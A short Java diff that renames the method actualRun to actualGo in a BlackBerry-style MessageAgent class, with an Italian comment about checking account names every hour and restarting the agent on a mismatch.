@@ -156,7 +156,7 @@ public final class MessageAgent extends Module implements SmsObserver,
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualRun() {
+    public void actualGo() {
 
         // Ogni ora viene verificato se i nomi degli account corrisponde
         // se non corrisponde, restart dell'agente.
